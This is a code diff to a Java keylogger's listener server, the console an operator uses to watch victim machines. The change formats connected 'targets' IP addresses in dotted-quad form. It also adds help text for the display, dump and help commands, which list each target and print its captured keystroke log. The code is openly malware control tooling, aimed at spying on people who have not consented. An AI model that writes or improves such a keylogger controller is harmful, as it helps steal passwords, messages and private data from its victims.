@@ -52,7 +52,11 @@ public class KeyLoggerInterface extends Frame{
                      keylogdata[] tmp = getBuffer();
                      System.out.printf("[*] Connected Targets: %d\n\tIP ADDRESS\t\tASSOCIATED LOG FILE \n", tmp.length);
                      for (keylogdata tmp1 : tmp) {
-                         System.out.printf("\t[*] %d\t\t%s\n", tmp1.IPaddress, tmp1.Fname);
+                         System.out.printf("\t[*] %d.%d.%d.%d\t\t%s\n", (0xff000000 & tmp1.IPaddress)>>24,
+                                                                     (0x00ff0000 & tmp1.IPaddress)>>16,
+                                                                     (0x0000ff00 & tmp1.IPaddress)>> 8,
+                                                                     (0x000000ff & tmp1.IPaddress)    ,
+                                                                     tmp1.Fname);
                      }
                 break;
                 case "dump":
@@ -62,6 +66,11 @@ public class KeyLoggerInterface extends Frame{
                 case "":
                 break;
                 case "help":
+                    System.out.print("\nWelcome to the Keylogger listener server.\nThis server is curently listening for connections from your targets"
+                            + "\n\nCommand\t\t\tDescription\n"
+                            + "[*] display\t\tdisplays all ip addresses currently connected as well as\n\t\t\ttheir associated log files\n\n"
+                            + "[*] dump <ip address>\tthe dump command will display the contents of an\n\t\t\txml file as it is at this point in time!\n\n"
+                            + "[*] help \t\tdisplays this help message\n\n");
                 break;
                 default:
                     System.out.println("invalid command\n");
